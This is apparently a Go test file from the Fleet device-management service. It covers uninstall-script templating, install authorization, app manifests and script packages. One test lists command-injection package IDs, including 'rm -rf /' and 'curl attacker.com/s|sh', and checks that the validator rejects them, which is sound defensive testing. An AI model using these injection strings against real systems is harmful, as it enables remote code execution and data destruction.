package service

import (
	"context"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"os"
	"strings"
	"sync"
	"testing"
	"time"

	ma "github.com/fleetdm/fleet/v4/ee/maintained-apps"
	"github.com/fleetdm/fleet/v4/pkg/file"
	"github.com/fleetdm/fleet/v4/server/authz"
	"github.com/fleetdm/fleet/v4/server/config"
	"github.com/fleetdm/fleet/v4/server/contexts/viewer"
	"github.com/fleetdm/fleet/v4/server/datastore/s3"
	"github.com/fleetdm/fleet/v4/server/dev_mode"
	"github.com/fleetdm/fleet/v4/server/fleet"
	"github.com/fleetdm/fleet/v4/server/mock"
	redismock "github.com/fleetdm/fleet/v4/server/mock/redis"
	svcmock "github.com/fleetdm/fleet/v4/server/mock/service"
	"github.com/fleetdm/fleet/v4/server/ptr"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestPreProcessUninstallScript(t *testing.T) {
	t.Parallel()
	input := `
blah$PACKAGE_IDS
pkgids=$PACKAGE_ID
they are $PACKAGE_ID, right $MY_SECRET?
quotes for "$PACKAGE_ID"
blah${PACKAGE_ID}withConcat
quotes and braces for "${PACKAGE_ID}"
${PACKAGE_ID}`

	payload := fleet.UploadSoftwareInstallerPayload{
		Extension:       "exe",
		UninstallScript: input,
		PackageIDs:      []string{"com.foo"},
	}

	require.NoError(t, preProcessUninstallScript(&payload))
	expected := `
blah$PACKAGE_IDS
pkgids='com.foo'
they are 'com.foo', right $MY_SECRET?
quotes for 'com.foo'
blah'com.foo'withConcat
quotes and braces for 'com.foo'
'com.foo'`
	assert.Equal(t, expected, payload.UninstallScript)

	payload = fleet.UploadSoftwareInstallerPayload{
		Extension:       "pkg",
		UninstallScript: input,
		PackageIDs:      []string{"com.foo", "com.bar"},
	}
	require.NoError(t, preProcessUninstallScript(&payload))
	expected = `
blah$PACKAGE_IDS
pkgids=(
  'com.foo'
  'com.bar'
)
they are (
  'com.foo'
  'com.bar'
), right $MY_SECRET?
quotes for (
  'com.foo'
  'com.bar'
)
blah(
  'com.foo'
  'com.bar'
)withConcat
quotes and braces for (
  'com.foo'
  'com.bar'
)
(
  'com.foo'
  'com.bar'
)`
	assert.Equal(t, expected, payload.UninstallScript)

	payload.UninstallScript = "$UPGRADE_CODE"
	require.Error(t, preProcessUninstallScript(&payload))

	payload.UpgradeCode = "foo"
	require.NoError(t, preProcessUninstallScript(&payload))
	assert.Equal(t, `'foo'`, payload.UninstallScript)
}

func TestPreProcessUninstallScriptMaliciousInput(t *testing.T) {
	t.Parallel()

	maliciousIDs := []struct {
		name string
		id   string
	}{
		{"command substitution", "com.app$(id)"},
		{"backtick execution", "app`id`"},
		{"pipe injection", "app|rm -rf /"},
		{"semicolon injection", "app;curl attacker.com"},
		{"ampersand injection", "app&wget evil.com"},
		{"redirect injection", "app>file"},
		{"subshell injection", "com.app$(curl attacker.com/s|sh)"},
		{"single quote escape attempt", "app'$(id)'"},
		{"double quote injection", `app"$(id)"`},
		{"backslash injection", `app\nid`},
		{"newline injection", "app\nid"},
	}

	for _, tc := range maliciousIDs {
		t.Run(tc.name, func(t *testing.T) {
			payload := fleet.UploadSoftwareInstallerPayload{
				Extension:       "deb",
				UninstallScript: "$PACKAGE_ID",
				PackageIDs:      []string{tc.id},
			}
			require.Error(t, preProcessUninstallScript(&payload), "expected error for malicious input: %s", tc.id)
		})
	}

	// Verify valid identifiers still pass
	validIDs := []string{
		"com.example.app",
		"ruby",
		"org.mozilla.firefox",
		"{12345-ABCDE-67890}",
		"Microsoft.VisualStudioCode",
		"package/name",
		"my-app_v2.0+build1",
	}
	for _, id := range validIDs {
		payload := fleet.UploadSoftwareInstallerPayload{
			Extension:       "deb",
			UninstallScript: "$PACKAGE_ID",
			PackageIDs:      []string{id},
		}
		require.NoError(t, preProcessUninstallScript(&payload), "expected no error for valid input: %s", id)
	}
}

func TestPreProcessUninstallScriptSkipsValidationWhenNoTemplateVars(t *testing.T) {
	t.Parallel()

	// Non-ASCII package ID that would fail the safeIdentifierRegex validation
	nonASCIIID := "CrossCore\u00ae Embedded Studio v3.0.2"

	t.Run("non-ASCII ID succeeds when script has no template vars", func(t *testing.T) {
		payload := fleet.UploadSoftwareInstallerPayload{
			Extension:       "exe",
			UninstallScript: `$softwareName = "CrossCore Embedded Studio"`,
			PackageIDs:      []string{nonASCIIID},
		}
		require.NoError(t, preProcessUninstallScript(&payload))
		assert.Equal(t, `$softwareName = "CrossCore Embedded Studio"`, payload.UninstallScript)
	})

	t.Run("non-ASCII ID succeeds when script uses PACKAGE_ID", func(t *testing.T) {
		payload := fleet.UploadSoftwareInstallerPayload{
			Extension:       "exe",
			UninstallScript: "$PACKAGE_ID",
			PackageIDs:      []string{nonASCIIID},
		}
		require.NoError(t, preProcessUninstallScript(&payload))
		assert.Contains(t, payload.UninstallScript, "'"+nonASCIIID+"'")
	})

	t.Run("non-ASCII upgrade code succeeds when script has no UPGRADE_CODE", func(t *testing.T) {
		payload := fleet.UploadSoftwareInstallerPayload{
			Extension:       "msi",
			UninstallScript: "msiexec /x $PACKAGE_ID /quiet",
			PackageIDs:      []string{"valid-id"},
			UpgradeCode:     "code\u00ae",
		}
		require.NoError(t, preProcessUninstallScript(&payload))
		assert.Contains(t, payload.UninstallScript, "'valid-id'")
	})

	t.Run("non-ASCII upgrade code succeeds when script uses UPGRADE_CODE", func(t *testing.T) {
		payload := fleet.UploadSoftwareInstallerPayload{
			Extension:       "msi",
			UninstallScript: "msiexec /x $UPGRADE_CODE /quiet",
			PackageIDs:      []string{"valid-id"},
			UpgradeCode:     "code\u00ae",
		}
		require.NoError(t, preProcessUninstallScript(&payload))
		assert.Contains(t, payload.UninstallScript, "'code\u00ae'")
	})

	t.Run("dmg skips validation entirely", func(t *testing.T) {
		payload := fleet.UploadSoftwareInstallerPayload{
			Extension:       "dmg",
			UninstallScript: "$PACKAGE_ID\n\necho 'foo'",
			PackageIDs:      []string{nonASCIIID},
		}
		require.NoError(t, preProcessUninstallScript(&payload))
		require.Equal(t, "$PACKAGE_ID\n\necho 'foo'", payload.UninstallScript) // confirm no variable substitution
	})

	t.Run("zip skips validation entirely", func(t *testing.T) {
		payload := fleet.UploadSoftwareInstallerPayload{
			Extension:       "zip",
			UninstallScript: "$PACKAGE_ID\n\necho 'foo'",
			PackageIDs:      []string{nonASCIIID},
		}
		require.NoError(t, preProcessUninstallScript(&payload))
		require.Equal(t, "$PACKAGE_ID\n\necho 'foo'", payload.UninstallScript) // confirm no variable substitution
	})

	t.Run("empty PackageIDs skips processing", func(t *testing.T) {
		payload := fleet.UploadSoftwareInstallerPayload{
			Extension:       "exe",
			UninstallScript: "$PACKAGE_ID",
			PackageIDs:      []string{},
		}
		require.NoError(t, preProcessUninstallScript(&payload))
		require.Equal(t, "$PACKAGE_ID", payload.UninstallScript) // confirm no variable substitution
	})
}

func TestInstallUninstallAuth(t *testing.T) {
	t.Parallel()
	ds := new(mock.Store)
	svc := newTestService(t, ds)

	ds.AppConfigFunc = func(ctx context.Context) (*fleet.AppConfig, error) {
		return &fleet.AppConfig{
			ServerSettings: fleet.ServerSettings{ScriptsDisabled: true},
		}, nil
	}
	ds.HostFunc = func(ctx context.Context, id uint) (*fleet.Host, error) {
		return &fleet.Host{
			OrbitNodeKey: ptr.String("orbit_key"),
			Platform:     "darwin",
			TeamID:       ptr.Uint(1),
		}, nil
	}
	ds.GetSoftwareInstallerMetadataByTeamAndTitleIDFunc = func(ctx context.Context, teamID *uint, titleID uint,
		withScriptContents bool,
	) (*fleet.SoftwareInstaller, error) {
		return &fleet.SoftwareInstaller{
			Name:     "installer.pkg",
			Platform: "darwin",
			TeamID:   ptr.Uint(1),
		}, nil
	}
	ds.GetHostLastInstallDataFunc = func(ctx context.Context, hostID uint, installerID uint) (*fleet.HostLastInstallData, error) {
		return nil, nil
	}
	ds.ResetNonPolicyInstallAttemptsFunc = func(ctx context.Context, hostID uint, softwareInstallerID uint) error {
		return nil
	}
	ds.InsertSoftwareInstallRequestFunc = func(ctx context.Context, hostID uint, softwareInstallerID uint, opts fleet.HostSoftwareInstallOptions) (string,
		error,
	) {
		return "request_id", nil
	}
	ds.GetAnyScriptContentsFunc = func(ctx context.Context, id uint) ([]byte, error) {
		return []byte("script"), nil
	}
	ds.InsertSoftwareUninstallRequestFunc = func(ctx context.Context, executionID string, hostID uint, softwareInstallerID uint, selfService bool) error {
		return nil
	}

	ds.IsSoftwareInstallerLabelScopedFunc = func(ctx context.Context, installerID, hostID uint) (bool, error) {
		return true, nil
	}

	testCases := []struct {
		name       string
		user       *fleet.User
		shouldFail bool
	}{
		{
			"global admin",
			&fleet.User{GlobalRole: ptr.String(fleet.RoleAdmin)},
			false,
		},
		{
			"global maintainer",
			&fleet.User{GlobalRole: ptr.String(fleet.RoleMaintainer)},
			false,
		},
		{
			"global observer",
			&fleet.User{GlobalRole: ptr.String(fleet.RoleObserver)},
			true,
		},
		{
			"team admin",
			&fleet.User{Teams: []fleet.UserTeam{{Team: fleet.Team{ID: 1}, Role: fleet.RoleAdmin}}},
			false,
		},
		{
			"team maintainer",
			&fleet.User{Teams: []fleet.UserTeam{{Team: fleet.Team{ID: 1}, Role: fleet.RoleMaintainer}}},
			false,
		},
		{
			"team observer",
			&fleet.User{Teams: []fleet.UserTeam{{Team: fleet.Team{ID: 1}, Role: fleet.RoleObserver}}},
			true,
		},
	}
	for _, tt := range testCases {
		t.Run(tt.name, func(t *testing.T) {
			ctx := viewer.NewContext(context.Background(), viewer.Viewer{User: tt.user})
			checkAuthErr(t, tt.shouldFail, svc.InstallSoftwareTitle(ctx, 1, 10))
			checkAuthErr(t, tt.shouldFail, svc.UninstallSoftwareTitle(ctx, 1, 10))
		})
	}
}

func TestUninstallSoftwareTitle(t *testing.T) {
	t.Parallel()
	ds := new(mock.Store)
	svc := newTestService(t, ds)

	host := &fleet.Host{
		OrbitNodeKey: ptr.String("orbit_key"),
		Platform:     "darwin",
		TeamID:       ptr.Uint(1),
	}

	ds.HostFunc = func(ctx context.Context, id uint) (*fleet.Host, error) {
		return host, nil
	}

	ds.AppConfigFunc = func(ctx context.Context) (*fleet.AppConfig, error) {
		return &fleet.AppConfig{
			ServerSettings: fleet.ServerSettings{
				ScriptsDisabled: true,
			},
		}, nil
	}

	host.ScriptsEnabled = ptr.Bool(false)
	require.ErrorContains(t, svc.UninstallSoftwareTitle(context.Background(), 1, 10), fleet.RunScriptsOrbitDisabledErrMsg)
}

func TestInstallSoftwareTitleAllowsPersonallyEnrolledDevices(t *testing.T) {
	t.Parallel()
	ds := new(mock.Store)
	svc := newTestService(t, ds)

	// Personally-enrolled iOS/iPadOS hosts must reach the install lookup; the
	// BYOD gate that previously short-circuited them is removed in #43998.
	// Returning NotFound from the in-house and VPP app lookups makes the code
	// surface the standard "title not available" error — proving we got past
	// the old gate without entangling this test in the install flow.
	ds.GetInHouseAppMetadataByTeamAndTitleIDFunc = func(ctx context.Context, teamID *uint, titleID uint) (*fleet.SoftwareInstaller, error) {
		return nil, nil
	}
	ds.GetVPPAppByTeamAndTitleIDFunc = func(ctx context.Context, teamID *uint, titleID uint) (*fleet.VPPApp, error) {
		return nil, &notFoundError{}
	}

	ctx := viewer.NewContext(context.Background(), viewer.Viewer{User: &fleet.User{GlobalRole: ptr.String(fleet.RoleAdmin)}})

	host := &fleet.Host{
		UUID:         "personal-ios",
		OrbitNodeKey: ptr.String("orbit_key"),
		Platform:     "ios",
		TeamID:       ptr.Uint(1),
		MDM: fleet.MDMHostData{
			EnrollmentStatus: ptr.String(string(fleet.MDMEnrollStatusPersonal)),
		},
	}

	ds.HostFunc = func(ctx context.Context, id uint) (*fleet.Host, error) {
		return host, nil
	}

	err := svc.InstallSoftwareTitle(ctx, 1, 10)
	require.Error(t, err)
	require.NotContains(t, err.Error(), fleet.InstallSoftwarePersonalAppleDeviceErrMsg,
		"BYOD gate must no longer block install for personally-enrolled iOS/iPadOS hosts")
	require.ErrorContains(t, err, "Software title is not available for install",
		"control flow must reach the standard not-found path")
}

func TestSoftwareInstallerPayloadFromSlug(t *testing.T) {
	ds := new(mock.Store)
	svc := newTestService(t, ds)

	installerBytes := []byte("1password")
	h := sha256.New()
	_, err := h.Write(installerBytes)
	require.NoError(t, err)
	onePasswordSHA := hex.EncodeToString(h.Sum(nil))

	manifestServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		slug := strings.TrimPrefix(strings.TrimSuffix(r.URL.Path, ".json"), "/")

		var versions []*ma.FMAManifestApp
		versions = append(versions, &ma.FMAManifestApp{
			Version: "1",
			Queries: ma.FMAQueries{
				Exists: "SELECT 1 FROM osquery_info;",
			},
			InstallerURL:       fmt.Sprintf("/installer-%s.zip", slug),
			InstallScriptRef:   "installscript",
			UninstallScriptRef: "uninstallscript",
			DefaultCategories:  []string{"Productivity"},
		})

		manifest := ma.FMAManifestFile{
			Versions: versions,
			Refs: map[string]string{
				"installscript":   "echo 'installing'",
				"uninstallscript": "echo 'uninstalling'",
			},
		}

		switch slug {
		case "":
			w.WriteHeader(http.StatusNotFound)
			return

		case "1password/darwin":
			manifest.Versions[0].SHA256 = onePasswordSHA

		case "google-chrome/darwin":
			manifest.Versions[0].SHA256 = "no_check"
		}

		err := json.NewEncoder(w).Encode(manifest)
		require.NoError(t, err)
	}))
	t.Cleanup(manifestServer.Close)
	dev_mode.SetOverride("FLEET_DEV_MAINTAINED_APPS_BASE_URL", manifestServer.URL, t)

	ds.GetMaintainedAppBySlugFunc = func(ctx context.Context, slug string, teamID *uint) (*fleet.MaintainedApp, error) {
		return &fleet.MaintainedApp{
			ID:               1,
			Name:             "1Password",
			Platform:         "darwin",
			UniqueIdentifier: "com.1password.1password",
			Slug:             "1password/darwin",
		}, nil
	}
	payload := fleet.SoftwareInstallerPayload{Slug: ptr.String("1password/darwin")}
	err = svc.softwareInstallerPayloadFromSlug(context.Background(), &payload, nil)
	require.NoError(t, err)
	assert.NotEmpty(t, payload.URL)
	assert.Equal(t, onePasswordSHA, payload.SHA256)
	assert.NotEmpty(t, payload.InstallScript)
	assert.NotEmpty(t, payload.UninstallScript)
	assert.True(t, payload.FleetMaintained)

	ds.GetMaintainedAppBySlugFunc = func(ctx context.Context, slug string, teamID *uint) (*fleet.MaintainedApp, error) {
		return &fleet.MaintainedApp{
			ID:               1,
			Name:             "Google Chrome",
			Platform:         "darwin",
			UniqueIdentifier: "com.google.Chrome",
			Slug:             "google-chrome/darwin",
		}, nil
	}
	payload = fleet.SoftwareInstallerPayload{Slug: ptr.String("google-chrome/darwin")}
	err = svc.softwareInstallerPayloadFromSlug(context.Background(), &payload, nil)
	require.NoError(t, err)
	assert.NotEmpty(t, payload.URL)
	assert.Empty(t, payload.SHA256)
	assert.NotEmpty(t, payload.InstallScript)
	assert.NotEmpty(t, payload.UninstallScript)
	assert.True(t, payload.FleetMaintained)

	payload = fleet.SoftwareInstallerPayload{URL: "https://fleetdm.com"}
	err = svc.softwareInstallerPayloadFromSlug(context.Background(), &payload, nil)
	require.NoError(t, err)
	assert.Nil(t, payload.Slug)
	assert.Equal(t, "https://fleetdm.com", payload.URL)
	assert.Empty(t, payload.SHA256)
	assert.Empty(t, payload.InstallScript)
	assert.Empty(t, payload.UninstallScript)
	assert.False(t, payload.FleetMaintained)

	ds.GetMaintainedAppBySlugFunc = func(ctx context.Context, slug string, teamID *uint) (*fleet.MaintainedApp, error) {
		return &fleet.MaintainedApp{
			ID:               1,
			Name:             "1Password",
			Platform:         "darwin",
			UniqueIdentifier: "com.1password.1password",
			Slug:             "1password/darwin",
			TitleID:          new(uint(1)),
		}, nil
	}

	ds.GetFleetMaintainedVersionsByTitleIDFunc = func(ctx context.Context, teamID *uint, titleID uint, byVersion bool) ([]fleet.FleetMaintainedVersion, error) {
		return []fleet.FleetMaintainedVersion{{ID: 1, Version: "26.0.0"}}, nil
	}

	ds.GetCachedFMAInstallerMetadataFunc = func(ctx context.Context, teamID *uint, fmaID uint, version string) (*fleet.MaintainedApp, error) {
		return &fleet.MaintainedApp{
			ID:               1,
			Name:             "1Password",
			Platform:         "darwin",
			UniqueIdentifier: "com.1password.1password",
			Slug:             "1password/darwin",
		}, nil
	}

	versionPinValidationTests := []struct {
		name    string
		version string
		wantErr string
	}{
		{
			name:    "valid",
			version: "^26",
		},
		{
			name:    "no version",
			version: "^",
			wantErr: errEmptyCaretVersion.Error(),
		},
		{
			name:    "invalid version",
			version: "^26.0",
			wantErr: errNonMajorVersion.Error(),
		},
	}

	for _, vt := range versionPinValidationTests {
		t.Run(vt.name, func(t *testing.T) {
			payload := fleet.SoftwareInstallerPayload{Slug: ptr.String("1password/darwin"), RollbackVersion: vt.version}
			err = svc.softwareInstallerPayloadFromSlug(context.Background(), &payload, nil)
			if vt.wantErr != "" {
				require.Error(t, err)
				require.ErrorContains(t, err, vt.wantErr)
			} else {
				require.NoError(t, err)
				// RollbackVersion must be left as the user typed it, including a caret, so the pin expression
				// survives downstream and is persisted to software_title_team_pins.
				require.Equal(t, vt.version, payload.RollbackVersion)
			}
		})
	}
}

func TestGetInHouseAppManifest(t *testing.T) {
	ds := new(mock.Store)
	svc := newTestService(t, ds)
	ctx := context.Background()

	const validToken = "00000000-0000-0000-0000-000000000001"

	ds.AppConfigFunc = func(ctx context.Context) (*fleet.AppConfig, error) {
		return &fleet.AppConfig{ServerSettings: fleet.ServerSettings{ServerURL: "https://example.com"}}, nil
	}

	ds.GetInHouseAppInstallTokenMetadataFunc = func(ctx context.Context, token string) (*fleet.InHouseAppInstallTokenMetadata, error) {
		if token == validToken {
			return &fleet.InHouseAppInstallTokenMetadata{
				Token:           validToken,
				SoftwareTitleID: 1,
				TeamID:          0,
				HostID:          7,
				ExpiresAt:       time.Now().Add(time.Hour),
			}, nil
		}
		return nil, &notFoundError{}
	}

	ds.GetInHouseAppMetadataByTeamAndTitleIDFunc = func(ctx context.Context, teamID *uint, titleID uint) (*fleet.SoftwareInstaller, error) {
		if titleID == 1 {
			return &fleet.SoftwareInstaller{
				BundleIdentifier: "com.foo.bar",
				Version:          "1.2.3",
				SoftwareTitle:    "test in-house app",
				StorageID:        "123storageid",
			}, nil
		}

		return nil, &notFoundError{}
	}

	expected := `
<plist version="1.0">
  <dict>
    <key>items</key>
    <array>
      <dict>
        <key>assets</key>
        <array>
          <dict>
            <key>kind</key>
            <string>software-package</string>
            <key>url</key>
            <string>https://example.com/api/latest/fleet/software/titles/1/in_house_app/00000000-0000-0000-0000-000000000001</string>
          </dict>
          <dict>
            <key>kind</key>
            <string>display-image</string>
            <key>needs-shine</key>
            <true/>
            <key>url</key>
            <string/>
          </dict>
        </array>
        <key>metadata</key>
        <dict>
          <key>bundle-identifier</key>
          <string>com.foo.bar</string>
          <key>bundle-version</key>
          <string>1.2.3</string>
          <key>kind</key>
          <string>software</string>
          <key>title</key>
          <string>test in-house app</string>
        </dict>
      </dict>
    </array>
  </dict>
</plist>`

	manifest, err := svc.GetInHouseAppManifest(ctx, 1, validToken)
	require.NoError(t, err)
	assert.Equal(t, expected, string(manifest))

	_, err = svc.GetInHouseAppManifest(ctx, 1, "ffffffff-ffff-ffff-ffff-ffffffffffff")
	require.Error(t, err)
	var permErr *fleet.PermissionError
	require.ErrorAs(t, err, &permErr)

	// Wrong-length token is rejected before a DB lookup happens.
	ds.GetInHouseAppInstallTokenMetadataFuncInvoked = false
	_, err = svc.GetInHouseAppManifest(ctx, 1, "short")
	require.Error(t, err)
	require.ErrorAs(t, err, &permErr)
	require.False(t, ds.GetInHouseAppInstallTokenMetadataFuncInvoked)

	_, err = svc.GetInHouseAppManifest(ctx, 2, validToken)
	require.Error(t, err)
	require.ErrorAs(t, err, &permErr)

	signer, _ := rsa.GenerateKey(rand.Reader, 2048)
	svc.config.S3.SoftwareInstallersCloudFrontSigner = signer
	signerURL := "https://example.cloudfront.net"

	s3Config := config.S3Config{
		SoftwareInstallersCloudFrontURL:                   signerURL,
		SoftwareInstallersCloudFrontURLSigningPublicKeyID: "ABC123XYZ",
		SoftwareInstallersCloudFrontSigner:                signer,
	}
	s3Store, err := s3.NewTestSoftwareInstallerStore(s3Config)
	require.NoError(t, err)
	svc.softwareInstallStore = s3Store

	manifest, err = svc.GetInHouseAppManifest(ctx, 1, validToken)
	require.NoError(t, err)
	require.Contains(t, string(manifest), signerURL)
}

func TestGetInHouseAppPackageTokenAuth(t *testing.T) {
	ds := new(mock.Store)
	svc := newTestService(t, ds)
	ctx := context.Background()

	const validToken = "00000000-0000-0000-0000-000000000002"

	ds.GetInHouseAppInstallTokenMetadataFunc = func(ctx context.Context, token string) (*fleet.InHouseAppInstallTokenMetadata, error) {
		if token == validToken {
			return &fleet.InHouseAppInstallTokenMetadata{
				Token:           validToken,
				SoftwareTitleID: 5,
				TeamID:          2,
				HostID:          7,
				ExpiresAt:       time.Now().Add(time.Hour),
			}, nil
		}
		return nil, &notFoundError{}
	}

	// Unknown token → permission error before the metadata mock would fire.
	_, err := svc.GetInHouseAppPackage(ctx, 5, "ffffffff-ffff-ffff-ffff-ffffffffffff")
	require.Error(t, err)
	var permErr *fleet.PermissionError
	require.ErrorAs(t, err, &permErr)
	require.False(t, ds.GetInHouseAppMetadataByTeamAndTitleIDFuncInvoked)

	_, err = svc.GetInHouseAppPackage(ctx, 99, validToken)
	require.Error(t, err)
	require.ErrorAs(t, err, &permErr)
	require.False(t, ds.GetInHouseAppMetadataByTeamAndTitleIDFuncInvoked)
}

func checkAuthErr(t *testing.T, shouldFail bool, err error) {
	t.Helper()
	if shouldFail {
		require.Error(t, err)
		var forbiddenError *authz.Forbidden
		require.ErrorAs(t, err, &forbiddenError)
	} else {
		require.NoError(t, err)
	}
}

func newTestService(t *testing.T, ds fleet.Datastore) *Service {
	t.Helper()
	authorizer, err := authz.NewAuthorizer()
	require.NoError(t, err)
	defaultMockCustomHostVitalsValidation(ds)
	svc := &Service{
		authz:  authorizer,
		ds:     ds,
		logger: slog.New(slog.NewTextHandler(io.Discard, nil)),
	}
	return svc
}

func newTestServiceWithMock(t *testing.T, ds fleet.Datastore) (*Service, *svcmock.Service) {
	t.Helper()
	authorizer, err := authz.NewAuthorizer()
	require.NoError(t, err)
	defaultMockCustomHostVitalsValidation(ds)
	baseSvc := new(svcmock.Service)
	svc := &Service{
		Service: baseSvc,
		authz:   authorizer,
		ds:      ds,
	}
	return svc, baseSvc
}

// Software installer and setup-experience uploads validate referenced custom
// host vitals, so mock-backed tests that don't care about it needn't stub it.
func defaultMockCustomHostVitalsValidation(ds fleet.Datastore) {
	if mockDS, ok := ds.(*mock.Store); ok && mockDS.ValidateReferencedCustomHostVitalsFunc == nil {
		mockDS.ValidateReferencedCustomHostVitalsFunc = func(ctx context.Context, documents []string) error { return nil }
	}
}

func TestAddScriptPackageMetadata(t *testing.T) {
	t.Parallel()
	ctx := context.Background()
	svc := newTestService(t, nil)

	t.Run("valid shell script", func(t *testing.T) {
		scriptContents := "#!/bin/bash\necho 'Installing software'\n"
		tmpFile, err := os.CreateTemp(t.TempDir(), "test-*.sh")
		require.NoError(t, err)
		defer tmpFile.Close()
		_, err = tmpFile.WriteString(scriptContents)
		require.NoError(t, err)

		tfr, err := fleet.NewKeepFileReader(tmpFile.Name())
		require.NoError(t, err)
		defer tfr.Close()

		payload := &fleet.UploadSoftwareInstallerPayload{
			InstallerFile: tfr,
			Filename:      "install-app.sh",
		}

		err = svc.addScriptPackageMetadata(ctx, payload, "sh")
		require.NoError(t, err)
		require.Equal(t, "install-app", payload.Title)
		require.Equal(t, "", payload.Version)
		require.Equal(t, scriptContents, payload.InstallScript)
		require.Equal(t, "linux", payload.Platform)
		require.Equal(t, "sh_packages", payload.Source)
		require.Empty(t, payload.BundleIdentifier)
		require.Empty(t, payload.PackageIDs)
		require.NotEmpty(t, payload.StorageID)
		require.Equal(t, "sh", payload.Extension)
	})

	t.Run("valid powershell script", func(t *testing.T) {
		scriptContents := "Write-Host 'Installing software'\n"
		tmpFile, err := os.CreateTemp(t.TempDir(), "test-*.ps1")
		require.NoError(t, err)
		defer tmpFile.Close()
		_, err = tmpFile.WriteString(scriptContents)
		require.NoError(t, err)

		tfr, err := fleet.NewKeepFileReader(tmpFile.Name())
		require.NoError(t, err)
		defer tfr.Close()

		payload := &fleet.UploadSoftwareInstallerPayload{
			InstallerFile: tfr,
			Filename:      "install-app.ps1",
		}

		err = svc.addScriptPackageMetadata(ctx, payload, "ps1")
		require.NoError(t, err)
		require.Equal(t, "install-app", payload.Title)
		require.Equal(t, "", payload.Version)
		require.Equal(t, scriptContents, payload.InstallScript)
		require.Equal(t, "windows", payload.Platform)
		require.Equal(t, "ps1_packages", payload.Source)
		require.Empty(t, payload.BundleIdentifier)
		require.Empty(t, payload.PackageIDs)
		require.NotEmpty(t, payload.StorageID)
	})

	t.Run("invalid shebang", func(t *testing.T) {
		scriptContents := "#!/usr/bin/python\nprint('hello')\n"
		tmpFile, err := os.CreateTemp(t.TempDir(), "test-*.sh")
		require.NoError(t, err)
		defer tmpFile.Close()
		_, err = tmpFile.WriteString(scriptContents)
		require.NoError(t, err)

		tfr, err := fleet.NewKeepFileReader(tmpFile.Name())
		require.NoError(t, err)
		defer tfr.Close()

		payload := &fleet.UploadSoftwareInstallerPayload{
			InstallerFile: tfr,
			Filename:      "test.sh",
		}

		err = svc.addScriptPackageMetadata(ctx, payload, "sh")
		require.Error(t, err)
		require.Contains(t, err.Error(), "Script validation failed")
		require.Contains(t, err.Error(), "Interpreter not supported")
	})

	t.Run("empty script", func(t *testing.T) {
		tmpFile, err := os.CreateTemp(t.TempDir(), "test-*.sh")
		require.NoError(t, err)
		defer tmpFile.Close()

		tfr, err := fleet.NewKeepFileReader(tmpFile.Name())
		require.NoError(t, err)
		defer tfr.Close()

		payload := &fleet.UploadSoftwareInstallerPayload{
			InstallerFile: tfr,
			Filename:      "test.sh",
		}

		err = svc.addScriptPackageMetadata(ctx, payload, "sh")
		require.Error(t, err)
		require.Contains(t, err.Error(), "must not be empty")
	})

	t.Run("custom title preserved", func(t *testing.T) {
		scriptContents := "#!/bin/bash\necho 'test'\n"
		tmpFile, err := os.CreateTemp(t.TempDir(), "test-*.sh")
		require.NoError(t, err)
		defer tmpFile.Close()
		_, err = tmpFile.WriteString(scriptContents)
		require.NoError(t, err)

		tfr, err := fleet.NewKeepFileReader(tmpFile.Name())
		require.NoError(t, err)
		defer tfr.Close()

		payload := &fleet.UploadSoftwareInstallerPayload{
			InstallerFile: tfr,
			Filename:      "test.sh",
			Title:         "My Custom Title",
		}

		err = svc.addScriptPackageMetadata(ctx, payload, "sh")
		require.NoError(t, err)
		require.Equal(t, "My Custom Title", payload.Title)
	})

	t.Run("file contents preserved verbatim", func(t *testing.T) {
		scriptContents := "#!/bin/bash\necho \"Test's 'quotes'\"\necho $VAR\n\n"
		tmpFile, err := os.CreateTemp(t.TempDir(), "test-*.sh")
		require.NoError(t, err)
		defer tmpFile.Close()
		_, err = tmpFile.WriteString(scriptContents)
		require.NoError(t, err)

		tfr, err := fleet.NewKeepFileReader(tmpFile.Name())
		require.NoError(t, err)
		defer tfr.Close()

		payload := &fleet.UploadSoftwareInstallerPayload{
			InstallerFile: tfr,
			Filename:      "test.sh",
		}

		err = svc.addScriptPackageMetadata(ctx, payload, "sh")
		require.NoError(t, err)
		require.Equal(t, scriptContents, payload.InstallScript)
	})
}

func TestAddScriptPackageMetadataLargeScript(t *testing.T) {
	t.Parallel()
	ctx := context.Background()
	svc := newTestService(t, nil)

	t.Run("large shell script within saved limit", func(t *testing.T) {
		t.Parallel()
		// Generate a script larger than UnsavedScriptMaxRuneLen (10K) but within
		// SavedScriptMaxRuneLen (500K). Script packages are persisted via GitOps
		// and should use the saved script limit.
		scriptContents := "#!/bin/bash\n" + strings.Repeat("echo 'line'\n", 1000)
		require.Greater(t, len(scriptContents), fleet.UnsavedScriptMaxRuneLen)
		require.Less(t, len(scriptContents), fleet.SavedScriptMaxRuneLen)

		tmpFile, err := os.CreateTemp(t.TempDir(), "test-*.sh")
		require.NoError(t, err)
		defer tmpFile.Close()
		_, err = tmpFile.WriteString(scriptContents)
		require.NoError(t, err)

		tfr, err := fleet.NewKeepFileReader(tmpFile.Name())
		require.NoError(t, err)
		defer tfr.Close()

		payload := &fleet.UploadSoftwareInstallerPayload{
			InstallerFile: tfr,
			Filename:      "large-install.sh",
		}

		err = svc.addScriptPackageMetadata(ctx, payload, "sh")
		require.NoError(t, err)
		require.Equal(t, scriptContents, payload.InstallScript)
	})

	t.Run("large powershell script within saved limit", func(t *testing.T) {
		t.Parallel()
		scriptContents := strings.Repeat("Write-Host 'line'\r\n", 1000)
		require.Greater(t, len(scriptContents), fleet.UnsavedScriptMaxRuneLen)
		require.Less(t, len(scriptContents), fleet.SavedScriptMaxRuneLen)

		tmpFile, err := os.CreateTemp(t.TempDir(), "test-*.ps1")
		require.NoError(t, err)
		defer tmpFile.Close()
		_, err = tmpFile.WriteString(scriptContents)
		require.NoError(t, err)

		tfr, err := fleet.NewKeepFileReader(tmpFile.Name())
		require.NoError(t, err)
		defer tfr.Close()

		payload := &fleet.UploadSoftwareInstallerPayload{
			InstallerFile: tfr,
			Filename:      "large-install.ps1",
		}

		err = svc.addScriptPackageMetadata(ctx, payload, "ps1")
		require.NoError(t, err)
		require.Equal(t, scriptContents, payload.InstallScript)
	})
}

// TestInstallShScriptOnDarwin tests that .sh scripts (stored as platform='linux')
// can be installed on darwin hosts.
func TestInstallShScriptOnDarwin(t *testing.T) {
	t.Parallel()
	ds := new(mock.Store)
	svc := newTestService(t, ds)

